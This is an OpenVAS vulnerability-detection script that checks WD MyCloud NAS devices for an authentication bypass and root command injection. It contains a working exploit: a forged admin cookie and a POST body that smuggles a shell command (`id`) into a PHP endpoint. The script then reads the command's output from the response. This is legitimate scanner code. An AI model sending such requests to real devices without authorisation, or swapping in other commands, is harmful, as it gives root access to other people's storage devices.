###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wd_mycloud_rce2.nasl 5998 2017-04-21 08:54:45Z cfi $
#
# WD MyCloud Products Authentication Bypass and Multiple Remote Command Injection Vulnerabilities
#
# Authors:
# Christian Fischer <christian.fischer@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:western_digital:mycloud_nas';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108149");
  script_version("$Revision: 5998 $");
  script_tag(name:"last_modification", value:"$Date: 2017-04-21 10:54:45 +0200 (Fri, 21 Apr 2017) $");
  script_tag(name:"creation_date", value:"2017-04-21 08:00:00 +0200 (Fri, 21 Apr 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("WD MyCloud Products Authentication Bypass and Multiple Remote Command Injection Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wd_mycloud_web_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("WD-MyCloud/www/detected");

  script_xref(name:"URL", value:"http://support.wdc.com/downloads.aspx?lang=en#firmware");
  script_xref(name:"URL", value:"https://www.exploitee.rs/index.php/Western_Digital_MyCloud");

  script_tag(name:"summary", value:"Western Digital MyCloud Products are prone to an authentication bypass and multiple remote command injection vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check the response.");

  script_tag(name:"impact", value:"Successful exploit allows an attacker to execute arbitrary commands with root privileges
  in context of the affected application.");

  script_tag(name:"solution", value:"The vendor has released firmware updates. Please see the reference for more details
  and downloads.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port, service:"www" ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/web/dsdk/DsdkProxy.php";
data = "';echo `id`;'";
cookie = 'isAdmin=1;username=admin" -s 1337 -c "';

req = http_post_req( port:port, url:url, data:data,
                     accept_header:"application/xml, text/xml, */*; q=0.01",
                     add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded", "Cookie", cookie ) );
res = http_keepalive_send_recv( port:port, data:req );

if( res =~ "HTTP/1\.[0-1] 200" && res =~ "uid=[0-9]+.*gid=[0-9]+" ) {

  uid = eregmatch( pattern:"(uid=[0-9]+.*gid=[0-9]+[^ ]+)", string:res );

  report = 'By requesting the URL "' + report_vuln_url( port:port, url:url, url_only:TRUE ) + '" with the following data set:\n\n' + 
           '"HTTP POST" body: ' + data + '\n' +
           'Cookie: ' + cookie + '\n\n' +
           'it was possible to execute the "id" command.\n\nResult: ' + uid[1] + '\n';

  expert_info = 'Request:\n'+ req + 'Response:\n' + res + '\n';

  security_message( port:port, data:report, expert_info:expert_info );
  exit( 0 );
}

exit( 99 );
